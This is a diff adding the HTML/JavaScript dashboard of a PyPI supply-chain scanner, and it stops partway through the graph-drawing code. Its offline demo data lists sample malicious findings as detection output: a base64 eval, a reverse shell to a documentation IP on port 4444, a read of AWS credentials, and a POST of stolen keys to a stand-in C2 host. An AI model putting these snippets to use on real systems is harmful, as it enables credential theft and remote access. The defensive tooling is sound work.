@@ -1,0 +1,724 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PackGuard — PyPI Security & Supply Chain Defense</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    body {
+      background-color: #0B0F17;
+      color: #E2E8F0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    }
+    .neon-border-safe { border-color: rgba(0, 255, 156, 0.4); box-shadow: 0 0 15px rgba(0, 255, 156, 0.15); }
+    .neon-border-suspicious { border-color: rgba(255, 176, 32, 0.4); box-shadow: 0 0 15px rgba(255, 176, 32, 0.15); }
+    .neon-border-danger { border-color: rgba(255, 71, 87, 0.4); box-shadow: 0 0 15px rgba(255, 71, 87, 0.15); }
+    .code-box { background: #070A0F; border: 1px solid #1E293B; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col">
+
+  <!-- Header Navigation -->
+  <header class="border-b border-slate-800 bg-slate-900/80 backdrop-blur sticky top-0 z-50 px-6 py-4">
+    <div class="max-w-7xl mx-auto flex items-center justify-between">
+      <div class="flex items-center space-x-3">
+        <div class="w-10 h-10 rounded-xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400">
+          <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+        </div>
+        <div>
+          <div class="flex items-center space-x-2">
+            <span class="text-xl font-bold tracking-tight text-white">PackGuard</span>
+            <span class="text-xs px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">v1.0.0</span>
+          </div>
+          <p class="text-xs text-slate-400">PyPI Supply-Chain Defense & AI-Hallucination Guard</p>
+        </div>
+      </div>
+
+      <div class="flex items-center space-x-4">
+        <div id="api-status-badge" class="flex items-center space-x-2 px-3 py-1.5 rounded-lg bg-slate-800 border border-slate-700 text-xs">
+          <span class="w-2 h-2 rounded-full bg-amber-400 animate-pulse" id="status-dot"></span>
+          <span class="text-slate-300 font-medium" id="status-text">Checking backend...</span>
+        </div>
+        <a href="http://localhost:8000/docs" target="_blank" class="px-3 py-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-xs text-slate-300 border border-slate-700 transition flex items-center space-x-1.5">
+          <span>Swagger Docs</span>
+          <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"/></svg>
+        </a>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Container -->
+  <main class="max-w-7xl mx-auto px-6 py-8 flex-1 w-full space-y-8">
+
+    <!-- Hero Search Section -->
+    <section class="bg-gradient-to-b from-slate-900 to-slate-900/60 border border-slate-800 rounded-2xl p-6 shadow-xl">
+      <h1 class="text-2xl font-bold text-white mb-2">Package Security Audit</h1>
+      <p class="text-sm text-slate-400 mb-6">Analyze Python packages with Random Forest ML, AST semantic classification (7 categories), OSV.dev CVE verification, NetworkX dependency blast radius, and AI-hallucination slopsquat detection.</p>
+
+      <form id="scan-form" class="flex flex-col sm:flex-row gap-3">
+        <div class="relative flex-1">
+          <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-500">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>
+          </div>
+          <input type="text" id="package-input" value="requests" placeholder="Enter PyPI package name (e.g. requests, urllib3, requests-utils)..." class="w-full bg-slate-950 border border-slate-700 rounded-xl pl-11 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-emerald-500 focus:ring-1 focus:ring-emerald-500 text-sm">
+        </div>
+        <button type="submit" id="scan-btn" class="bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-semibold px-6 py-3 rounded-xl transition flex items-center justify-center space-x-2 text-sm shadow-lg shadow-emerald-500/20">
+          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z"/></svg>
+          <span>Run Security Scan</span>
+        </button>
+      </form>
+
+      <!-- Preset Pills -->
+      <div class="mt-4 flex flex-wrap items-center gap-2">
+        <span class="text-xs text-slate-500 font-medium">Try demos:</span>
+        <button onclick="setQuery('requests')" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 px-2.5 py-1 rounded-md border border-slate-700">requests (CVE lookup)</button>
+        <button onclick="setQuery('requests-utils')" class="text-xs bg-red-950/60 hover:bg-red-900/60 text-red-300 px-2.5 py-1 rounded-md border border-red-800/50">requests-utils (Slopsquat Target)</button>
+        <button onclick="setQuery('urllib3')" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 px-2.5 py-1 rounded-md border border-slate-700">urllib3 (Safe 0%)</button>
+        <button onclick="setQuery('flask')" class="text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 px-2.5 py-1 rounded-md border border-slate-700">flask (Transitive Graph)</button>
+        <button onclick="setQuery('malicious-payload-demo')" class="text-xs bg-amber-950/60 hover:bg-amber-900/60 text-amber-300 px-2.5 py-1 rounded-md border border-amber-800/50">malicious-payload-demo (7-Taxonomy AST)</button>
+      </div>
+    </section>
+
+    <!-- Scan Progress / Loading Banner -->
+    <div id="scan-progress" class="hidden bg-slate-900 border border-slate-800 rounded-2xl p-6 text-center space-y-3">
+      <div class="inline-block animate-spin w-8 h-8 border-4 border-emerald-500 border-t-transparent rounded-full"></div>
+      <h3 class="text-lg font-semibold text-white">Running Multi-Stage Security Pipeline...</h3>
+      <div class="max-w-md mx-auto space-y-1 text-xs text-slate-400">
+        <p id="progress-step-1">✓ Fetching metadata from PyPI Warehouse API...</p>
+        <p id="progress-step-2">⏳ Parsing Python AST syntactic nodes...</p>
+        <p id="progress-step-3">⏳ Extracting 7-category taxonomy behavioral features...</p>
+        <p id="progress-step-4">⏳ Querying OSV.dev batch vulnerability database...</p>
+        <p id="progress-step-5">⏳ Evaluating Random Forest ML & Slopsquat heuristic...</p>
+      </div>
+    </div>
+
+    <!-- Results Section -->
+    <section id="results-container" class="space-y-6">
+
+      <!-- Top Metric Cards -->
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+
+        <!-- Gauge Card -->
+        <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 flex flex-col items-center justify-center text-center">
+          <span class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2">Overall Risk Score</span>
+          <div class="relative w-40 h-40 flex items-center justify-center">
+            <svg class="w-36 h-36 transform -rotate-90">
+              <circle cx="72" cy="72" r="58" stroke="#1E293B" stroke-width="12" fill="transparent"/>
+              <circle id="gauge-circle" cx="72" cy="72" r="58" stroke="#00FF9C" stroke-width="12" stroke-linecap="round" fill="transparent" stroke-dasharray="364" stroke-dashoffset="364" style="transition: stroke-dashoffset 1s ease, stroke 0.5s ease;"/>
+            </svg>
+            <div class="absolute flex flex-col items-center">
+              <span id="risk-score-value" class="text-3xl font-extrabold text-white">0</span>
+              <span class="text-xs text-slate-400">/ 100</span>
+            </div>
+          </div>
+          <div id="risk-badge-pill" class="mt-2 px-4 py-1 rounded-full text-xs font-bold uppercase tracking-wider bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
+            SAFE
+          </div>
+        </div>
+
+        <!-- Package Metadata Card -->
+        <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 flex flex-col justify-between">
+          <div>
+            <span class="text-xs font-semibold text-slate-400 uppercase tracking-wider">Scanned Target</span>
+            <h2 id="target-pkg-name" class="text-2xl font-bold text-white mt-1">requests</h2>
+            <p id="target-pkg-version" class="text-xs text-slate-400 mt-0.5">Version 2.31.0 · PyPI</p>
+
+            <div class="mt-4 space-y-2 text-xs">
+              <div class="flex justify-between py-1 border-b border-slate-800">
+                <span class="text-slate-400">ML Model Version</span>
+                <span class="text-slate-200 font-mono">rf_v1.0 (RandomForest)</span>
+              </div>
+              <div class="flex justify-between py-1 border-b border-slate-800">
+                <span class="text-slate-400">OSV.dev CVE Status</span>
+                <span id="meta-cve-status" class="text-emerald-400 font-semibold">Active & Synced</span>
+              </div>
+              <div class="flex justify-between py-1">
+                <span class="text-slate-400">Transitive Dependencies</span>
+                <span id="meta-deps-count" class="text-slate-200">4 packages (depth capped: 3)</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="mt-4 pt-3 border-t border-slate-800 flex items-center justify-between">
+            <span class="text-xs text-slate-500">Scan ID: <span id="meta-scan-id" class="font-mono text-slate-400">a4f910b2</span></span>
+            <button onclick="downloadPdfSim()" class="text-xs text-emerald-400 hover:text-emerald-300 flex items-center space-x-1 font-semibold">
+              <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>
+              <span>Export PDF Report</span>
+            </button>
+          </div>
+        </div>
+
+        <!-- Slopsquat AI Hallucination Status Card -->
+        <div id="slopsquat-card" class="bg-slate-900 border border-slate-800 rounded-2xl p-6 flex flex-col justify-between">
+          <div>
+            <div class="flex items-center justify-between">
+              <span class="text-xs font-semibold text-slate-400 uppercase tracking-wider">AI Hallucination Target</span>
+              <span id="slopsquat-badge" class="px-2 py-0.5 rounded text-[10px] font-bold uppercase bg-slate-800 text-slate-400 border border-slate-700">NEGATIVE</span>
+            </div>
+
+            <div class="mt-3 flex items-start space-x-3">
+              <div id="slopsquat-icon" class="p-2 rounded-xl bg-slate-800 text-slate-400">
+                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.663 17h4.673M12 3v1m6.364 1.636l-.707.707M21 12h-1M4 12H3m3.343-5.657l-.707-.707m2.828 9.9a5 5 0 117.072 0l-.548.547A3.374 3.374 0 0014 18.469V19a2 2 0 11-4 0v-.531c0-.895-.356-1.754-.988-2.386l-.548-.547z"/></svg>
+              </div>
+              <div class="flex-1">
+                <h4 id="slopsquat-title" class="text-sm font-semibold text-white">No Slopsquat Heuristic Risk</h4>
+                <p id="slopsquat-desc" class="text-xs text-slate-400 mt-1">Package does not match common LLM hallucination patterns or documented AI supply-chain hijack names.</p>
+              </div>
+            </div>
+          </div>
+
+          <div class="mt-4 pt-3 border-t border-slate-800 flex items-center justify-between text-[11px] text-slate-500">
+            <span>Method: <span class="font-mono text-slate-400">heuristic_proxy</span></span>
+            <span id="slopsquat-confidence">Confidence: 0%</span>
+          </div>
+        </div>
+
+      </div>
+
+      <!-- Expandable CVE Section -->
+      <div class="bg-slate-900 border border-slate-800 rounded-2xl overflow-hidden">
+        <button onclick="toggleSection('cve-content', 'cve-arrow')" class="w-full px-6 py-4 flex items-center justify-between bg-slate-900 hover:bg-slate-850 text-left transition">
+          <div class="flex items-center space-x-3">
+            <div class="p-2 rounded-lg bg-red-500/10 text-red-400 border border-red-500/20">
+              <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/></svg>
+            </div>
+            <div>
+              <h3 class="text-sm font-bold text-white flex items-center space-x-2">
+                <span>Known Vulnerabilities (OSV.dev / CVE)</span>
+                <span id="cve-count-badge" class="px-2 py-0.5 rounded-full text-xs font-semibold bg-slate-800 text-slate-300">0</span>
+              </h3>
+              <p class="text-xs text-slate-400">Known public security advisories (distinct from malicious-intent findings)</p>
+            </div>
+          </div>
+          <svg id="cve-arrow" class="w-5 h-5 text-slate-400 transform transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
+        </button>
+
+        <div id="cve-content" class="px-6 pb-6 pt-2 space-y-3">
+          <div id="cve-list" class="space-y-3">
+            <!-- Dynamically injected CVE cards -->
+          </div>
+        </div>
+      </div>
+
+      <!-- 7-Category Structured Taxonomy Findings -->
+      <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 space-y-4">
+        <div class="flex items-center justify-between">
+          <div>
+            <h3 class="text-base font-bold text-white">Syntactic AST Findings (7-Category Taxonomy)</h3>
+            <p class="text-xs text-slate-400">Static code analysis with per-line code snippets, AST classification, and 1.5x install-script weighting</p>
+          </div>
+          <span id="findings-total-badge" class="px-2.5 py-1 rounded-md text-xs font-mono font-bold bg-slate-800 text-slate-300">0 Findings</span>
+        </div>
+
+        <div id="findings-container" class="space-y-3">
+          <!-- Dynamically injected taxonomy findings -->
+        </div>
+      </div>
+
+      <!-- Dependency Graph & Centrality -->
+      <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 space-y-4">
+        <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-2">
+          <div>
+            <h3 class="text-base font-bold text-white">Dependency Graph & Blast Radius</h3>
+            <p class="text-xs text-slate-400">NetworkX degree centrality & in-degree blast radius (<span class="text-emerald-400">local blast radius within 3 levels</span>)</p>
+          </div>
+          <div class="flex items-center space-x-3 text-xs">
+            <span class="flex items-center space-x-1.5"><span class="w-2.5 h-2.5 rounded-full bg-emerald-400"></span><span class="text-slate-400">Safe</span></span>
+            <span class="flex items-center space-x-1.5"><span class="w-2.5 h-2.5 rounded-full bg-amber-400"></span><span class="text-slate-400">Medium</span></span>
+            <span class="flex items-center space-x-1.5"><span class="w-2.5 h-2.5 rounded-full bg-red-400"></span><span class="text-slate-400">High Blast Radius</span></span>
+          </div>
+        </div>
+
+        <!-- Canvas Graph Container -->
+        <div class="w-full overflow-x-auto bg-slate-950 border border-slate-800 rounded-xl p-4">
+          <canvas id="graph-canvas" width="900" height="380" class="mx-auto block"></canvas>
+        </div>
+      </div>
+
+    </section>
+
+  </main>
+
+  <!-- Footer -->
+  <footer class="border-t border-slate-800 py-6 text-center text-xs text-slate-500">
+    PackGuard Academic Research & Security Tool · IEEE Security & Privacy Pipeline Architecture
+  </footer>
+
+  <script>
+    const API_BASE = "http://localhost:8000";
+
+    // Demo Mock database for instant offline testing
+    const DEMO_DB = {
+      "requests": {
+        packageName: "requests",
+        version: "2.31.0",
+        riskScore: 28.5,
+        riskLabel: "safe",
+        slopsquat: { isPossibleSlopsquat: false, confidence: 0, reason: "Established mature package (> 10 years old), high download volume." },
+        cves: [
+          { cveId: "CVE-2023-32681", severity: "MEDIUM", summary: "Proxy-Authorization header leak in redirects", fixedVersion: "2.31.0" },
+          { cveId: "CVE-2018-18074", severity: "HIGH", summary: "Credentials leaked when HTTP redirect changes host", fixedVersion: "2.20.0" }
+        ],
+        findings: [
+          { category: "Exfiltration", title: "Outbound HTTP Call", severity: "low", filePath: "requests/api.py", lineNumber: 61, codeSnippet: "return session.request(method=method, url=url, **kwargs)" }
+        ],
+        graph: {
+          nodes: [
+            { id: "requests", label: "requests", inDegree: 0, degreeCentrality: 0.8, criticalityLabel: "Root Package", level: 0, risk: "safe", score: 28 },
+            { id: "urllib3", label: "urllib3", inDegree: 1, degreeCentrality: 0.5, criticalityLabel: "Low — 1 package depends on this", level: 1, risk: "safe", score: 10 },
+            { id: "charset-normalizer", label: "charset-normalizer", inDegree: 1, degreeCentrality: 0.3, criticalityLabel: "Low — 1 package depends on this", level: 1, risk: "safe", score: 8 },
+            { id: "idna", label: "idna", inDegree: 1, degreeCentrality: 0.3, criticalityLabel: "Low — 1 package depends on this", level: 1, risk: "safe", score: 5 },
+            { id: "certifi", label: "certifi", inDegree: 1, degreeCentrality: 0.3, criticalityLabel: "Low — leaf node", level: 1, risk: "safe", score: 5 }
+          ],
+          edges: [
+            { from: "requests", to: "urllib3" },
+            { from: "requests", to: "charset-normalizer" },
+            { from: "requests", to: "idna" },
+            { from: "requests", to: "certifi" }
+          ]
+        }
+      },
+      "requests-utils": {
+        packageName: "requests-utils",
+        version: "0.1.0",
+        riskScore: 78.4,
+        riskLabel: "high_risk",
+        slopsquat: {
+          isPossibleSlopsquat: true,
+          confidence: 95,
+          reason: "Heuristic proxy signals (95% confidence): AI naming pattern (suffix '-utils'), targets popular library 'requests', recently published (14 days old), low download volume (85 downloads). Bounded approximation of potential AI-hallucination target [Method: heuristic_proxy]."
+        },
+        cves: [],
+        findings: [
+          { category: "Metadata Manipulation", title: "Potential Slopsquatting / Hallucination Target", severity: "high", filePath: "setup.py", lineNumber: 12, codeSnippet: "name='requests-utils', version='0.1.0'" },
+          { category: "Persistence", title: "Custom Install Command Hook", severity: "critical", filePath: "setup.py", lineNumber: 28, codeSnippet: "cmdclass={'install': CustomInstallCommand}" }
+        ],
+        graph: {
+          nodes: [
+            { id: "requests-utils", label: "requests-utils", inDegree: 0, degreeCentrality: 0.2, criticalityLabel: "Root Package", level: 0, risk: "high_risk", score: 78 },
+            { id: "requests", label: "requests", inDegree: 1, degreeCentrality: 0.6, criticalityLabel: "Low — 1 package depends on this", level: 1, risk: "safe", score: 28 }
+          ],
+          edges: [
+            { from: "requests-utils", to: "requests" }
+          ]
+        }
+      },
+      "urllib3": {
+        packageName: "urllib3",
+        version: "2.2.1",
+        riskScore: 6.2,
+        riskLabel: "safe",
+        slopsquat: { isPossibleSlopsquat: false, confidence: 0, reason: "Established mature PyPI pillar (> 12 years)." },
+        cves: [],
+        findings: [],
+        graph: {
+          nodes: [
+            { id: "urllib3", label: "urllib3", inDegree: 0, degreeCentrality: 0.1, criticalityLabel: "Root Package", level: 0, risk: "safe", score: 6 }
+          ],
+          edges: []
+        }
+      },
+      "malicious-payload-demo": {
+        packageName: "malicious-payload-demo",
+        version: "1.0.0",
+        riskScore: 94.8,
+        riskLabel: "high_risk",
+        slopsquat: { isPossibleSlopsquat: false, confidence: 10, reason: "Synthetic AST detection benchmark" },
+        cves: [],
+        findings: [
+          { category: "Execution", title: "Dynamic Code Evaluation", severity: "critical", filePath: "setup.py", lineNumber: 42, codeSnippet: "eval(base64.b64decode('ZGVmIG1hbGljaW91cygpOi4uLg=='))" },
+          { category: "Command & Control", title: "Raw Socket Reverse Shell", severity: "critical", filePath: "payload.py", lineNumber: 18, codeSnippet: "s = socket.socket(); s.connect(('198.51.100.4', 4444)); os.dup2(s.fileno(), 0)" },
+          { category: "Discovery", title: "Credential Access (.env & AWS Keys)", severity: "high", filePath: "crawler.py", lineNumber: 55, codeSnippet: "open(os.path.expanduser('~/.aws/credentials'), 'r').read()" },
+          { category: "Exfiltration", title: "Outbound Data Exfiltration", severity: "high", filePath: "crawler.py", lineNumber: 89, codeSnippet: "requests.post('https://evil-c2.dev/api/loot', json=stolen_keys)" }
+        ],
+        graph: {
+          nodes: [
+            { id: "malicious-payload-demo", label: "malicious-payload-demo", inDegree: 0, degreeCentrality: 0.5, criticalityLabel: "Root Package", level: 0, risk: "high_risk", score: 95 }
+          ],
+          edges: []
+        }
+      }
+    };
+
+    // Check backend health on load
+    async function checkBackend() {
+      const dot = document.getElementById("status-dot");
+      const text = document.getElementById("status-text");
+      try {
+        const res = await fetch(`${API_BASE}/api/v1/health`, { signal: AbortSignal.timeout(2500) });
+        if (res.ok) {
+          dot.className = "w-2 h-2 rounded-full bg-emerald-400";
+          text.textContent = "Backend Live: :8000";
+          text.className = "text-emerald-400 font-semibold";
+          return true;
+        }
+      } catch (e) {
+        dot.className = "w-2 h-2 rounded-full bg-amber-400";
+        text.textContent = "Offline Demo Engine Active";
+        text.className = "text-amber-400 font-medium";
+      }
+      return false;
+    }
+
+    function setQuery(pkg) {
+      document.getElementById("package-input").value = pkg;
+      runScan(pkg);
+    }
+
+    async function runScan(pkgName) {
+      document.getElementById("scan-progress").classList.remove("hidden");
+      document.getElementById("results-container").classList.add("opacity-40");
+
+      let scanData = null;
+
+      // Try Live API first
+      try {
+        const liveRes = await fetch(`${API_BASE}/api/v1/scan/package`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Authorization": "Bearer dev:analyst_uid:analyst@packguard.local"
+          },
+          body: JSON.stringify({ packageName: pkgName }),
+          signal: AbortSignal.timeout(8000)
+        });
+        if (liveRes.ok) {
+          const apiJson = await liveRes.json();
+          // Transform API JSON into view model
+          scanData = {
+            packageName: apiJson.packageName,
+            version: apiJson.packageVersion || "latest",
+            riskScore: apiJson.riskScore || 0,
+            riskLabel: apiJson.riskLabel || "safe",
+            slopsquat: apiJson.slopsquatAnalysis || { isPossibleSlopsquat: false, confidence: 0, reason: "" },
+            cves: (apiJson.knownVulnerabilities || []).map(c => ({
+              cveId: c.cveId || c.cve_id,
+              severity: c.severity,
+              summary: c.summary,
+              fixedVersion: c.fixedVersion || c.fixed_version
+            })),
+            findings: apiJson.findings || [],
+            graph: null // will fetch graph endpoint
+          };
+
+          // Fetch graph
+          try {
+            const gRes = await fetch(`${API_BASE}/api/v1/scan/dependency-graph/${pkgName}`, {
+              headers: { "Authorization": "Bearer dev:analyst_uid:analyst@packguard.local" }
+            });
+            if (gRes.ok) {
+              const gJson = await gRes.json();
+              scanData.graph = {
+                nodes: gJson.nodes.map(n => ({
+                  id: n.id,
+                  label: n.label,
+                  inDegree: n.inDegree,
+                  degreeCentrality: n.degreeCentrality,
+                  criticalityLabel: n.criticalityLabel,
+                  level: n.depthInTree,
+                  risk: n.riskLevel,
+                  score: n.riskScore
+                })),
+                edges: gJson.edges.map(e => ({ from: e.source, to: e.target }))
+              };
+            }
+          } catch(e) {}
+        }
+      } catch (e) {
+        console.log("Live API unavailable, using offline demo model", e);
+      }
+
+      // Fallback to local demo DB
+      if (!scanData) {
+        await new Promise(r => setTimeout(r, 600)); // smooth progress animation
+        scanData = DEMO_DB[pkgName] || {
+          packageName: pkgName,
+          version: "1.0.0",
+          riskScore: 12.0,
+          riskLabel: "safe",
+          slopsquat: { isPossibleSlopsquat: false, confidence: 0, reason: "No AI convention pattern detected" },
+          cves: [],
+          findings: [],
+          graph: {
+            nodes: [{ id: pkgName, label: pkgName, inDegree: 0, degreeCentrality: 0.1, criticalityLabel: "Root Package", level: 0, risk: "safe", score: 12 }],
+            edges: []
+          }
+        };
+      }
+
+      document.getElementById("scan-progress").classList.add("hidden");
+      document.getElementById("results-container").classList.remove("opacity-40");
+
+      renderResults(scanData);
+    }
+
+    function renderResults(data) {
+      // 1. Metric values
+      document.getElementById("target-pkg-name").textContent = data.packageName;
+      document.getElementById("target-pkg-version").textContent = `Version ${data.version} · PyPI`;
+      document.getElementById("risk-score-value").textContent = Math.round(data.riskScore);
+
+      // Gauge animation
+      const score = Math.min(100, Math.max(0, data.riskScore));
+      const circumference = 364;
+      const offset = circumference - (score / 100) * circumference;
+      const circle = document.getElementById("gauge-circle");
+      circle.style.strokeDashoffset = offset;
+
+      const badge = document.getElementById("risk-badge-pill");
+      if (score >= 70) {
+        circle.style.stroke = "#FF4757";
+        badge.className = "mt-2 px-4 py-1 rounded-full text-xs font-bold uppercase tracking-wider bg-red-500/20 text-red-400 border border-red-500/30";
+        badge.textContent = "HIGH RISK";
+      } else if (score >= 35) {
+        circle.style.stroke = "#FFB020";
+        badge.className = "mt-2 px-4 py-1 rounded-full text-xs font-bold uppercase tracking-wider bg-amber-500/20 text-amber-400 border border-amber-500/30";
+        badge.textContent = "SUSPICIOUS";
+      } else {
+        circle.style.stroke = "#00FF9C";
+        badge.className = "mt-2 px-4 py-1 rounded-full text-xs font-bold uppercase tracking-wider bg-emerald-500/20 text-emerald-400 border border-emerald-500/30";
+        badge.textContent = "SAFE";
+      }
+
+      // 2. Slopsquat
+      const slop = data.slopsquat;
+      const slopCard = document.getElementById("slopsquat-card");
+      const slopBadge = document.getElementById("slopsquat-badge");
+      const slopTitle = document.getElementById("slopsquat-title");
+      const slopDesc = document.getElementById("slopsquat-desc");
+      const slopConf = document.getElementById("slopsquat-confidence");
+
+      if (slop.isPossibleSlopsquat) {
+        slopCard.className = "bg-slate-900 border border-red-500/50 rounded-2xl p-6 flex flex-col justify-between neon-border-danger";
+        slopBadge.className = "px-2 py-0.5 rounded text-[10px] font-bold uppercase bg-red-500/20 text-red-300 border border-red-500/40";
+        slopBadge.textContent = "TARGET FLAGGED";
+        slopTitle.textContent = "AI-Hallucination Slopsquat Risk";
+        slopTitle.className = "text-sm font-bold text-red-400";
+        slopDesc.textContent = slop.reason;
+        slopConf.textContent = `Confidence: ${slop.confidence}%`;
+      } else {
+        slopCard.className = "bg-slate-900 border border-slate-800 rounded-2xl p-6 flex flex-col justify-between";
+        slopBadge.className = "px-2 py-0.5 rounded text-[10px] font-bold uppercase bg-slate-800 text-slate-400 border border-slate-700";
+        slopBadge.textContent = "NEGATIVE";
+        slopTitle.textContent = "No Slopsquat Heuristic Risk";
+        slopTitle.className = "text-sm font-semibold text-white";
+        slopDesc.textContent = slop.reason || "Package does not match common LLM hallucination naming conventions or documented incidents.";
+        slopConf.textContent = `Confidence: ${slop.confidence || 0}%`;
+      }
+
+      // 3. Known Vulnerabilities (CVE)
+      const cveList = document.getElementById("cve-list");
+      document.getElementById("cve-count-badge").textContent = data.cves.length;
+      cveList.innerHTML = "";
+
+      if (data.cves.length === 0) {
+        cveList.innerHTML = `
+          <div class="p-4 rounded-xl bg-slate-950 border border-slate-800 text-center text-xs text-slate-400">
+            ✓ No known public CVE advisories reported in OSV.dev batch index for this package version.
+          </div>
+        `;
+      } else {
+        data.cves.forEach(c => {
+          const sevColor = c.severity === "CRITICAL" ? "bg-red-500/20 text-red-400 border-red-500/30" :
+                           c.severity === "HIGH" ? "bg-red-500/15 text-red-300 border-red-500/20" :
+                           "bg-amber-500/20 text-amber-300 border-amber-500/30";
+          cveList.innerHTML += `
+            <div class="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2">
+              <div class="flex items-center justify-between">
+                <div class="flex items-center space-x-2">
+                  <span class="font-mono text-xs font-bold text-white">${c.cveId}</span>
+                  <span class="px-2 py-0.5 rounded text-[10px] font-bold border ${sevColor}">${c.severity}</span>
+                </div>
+                ${c.fixedVersion ? `<span class="text-xs text-emerald-400">Fixed in v${c.fixedVersion}</span>` : `<span class="text-xs text-slate-500">No fix known</span>`}
+              </div>
+              <p class="text-xs text-slate-300 leading-relaxed">${c.summary}</p>
+            </div>
+          `;
+        });
+      }
+
+      // 4. Taxonomy Findings
+      const findingsCont = document.getElementById("findings-container");
+      document.getElementById("findings-total-badge").textContent = `${data.findings.length} Findings`;
+      findingsCont.innerHTML = "";
+
+      if (data.findings.length === 0) {
+        findingsCont.innerHTML = `
+          <div class="p-6 rounded-xl bg-slate-950 border border-emerald-500/20 text-center space-y-2">
+            <div class="w-8 h-8 rounded-full bg-emerald-500/10 text-emerald-400 flex items-center justify-center mx-auto">
+              <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>
+            </div>
+            <h4 class="text-sm font-semibold text-emerald-400">Clean Static AST Profile</h4>
+            <p class="text-xs text-slate-400 max-w-md mx-auto">No dangerous dynamic eval, raw socket exfiltration, persistence hooks, or typosquatting patterns detected in source code.</p>
+          </div>
+        `;
+      } else {
+        data.findings.forEach(f => {
+          findingsCont.innerHTML += `
+            <div class="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2.5">
+              <div class="flex items-center justify-between">
+                <div class="flex items-center space-x-2">
+                  <span class="px-2.5 py-0.5 rounded text-[11px] font-bold bg-slate-800 text-slate-200 border border-slate-700">${f.category}</span>
+                  <span class="text-xs font-semibold text-white">${f.title || f.category}</span>
+                </div>
+                <span class="text-xs font-mono text-slate-500">${f.filePath}:${f.lineNumber || 1}</span>
+              </div>
+              ${f.codeSnippet ? `
+                <div class="code-box p-2.5 rounded-lg text-xs text-slate-300 overflow-x-auto">
+                  <code>Line ${f.lineNumber}: ${f.codeSnippet}</code>
+                </div>
+              ` : ''}
+            </div>
+          `;
+        });
+      }
+
+      // 5. Draw Dependency Graph
+      drawDependencyGraph(data.graph);
+    }
+
+    function drawDependencyGraph(graph) {
+      const canvas = document.getElementById("graph-canvas");
+      if (!canvas) return;
+      const ctx = canvas.getContext("2d");
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+      if (!graph || graph.nodes.length === 0) {
+        ctx.fillStyle = "#64748B";
+        ctx.font = "13px sans-serif";
+        ctx.textAlign = "center";
+        ctx.fillText("No dependencies resolved", canvas.width / 2, canvas.height / 2);
+        return;
+      }
+
+      // Positions
+      const nodeMap = {};
+      const levels = {};
+      graph.nodes.forEach(n => {
+        levels[n.level] = levels[n.level] || [];
+        levels[n.level].push(n);
+      });
+
+      const levelKeys = Object.keys(levels).sort((a,b) => a - b);
+      const levelGap = 160;
+      const cardW = 200;
+      const cardH = 68;
+
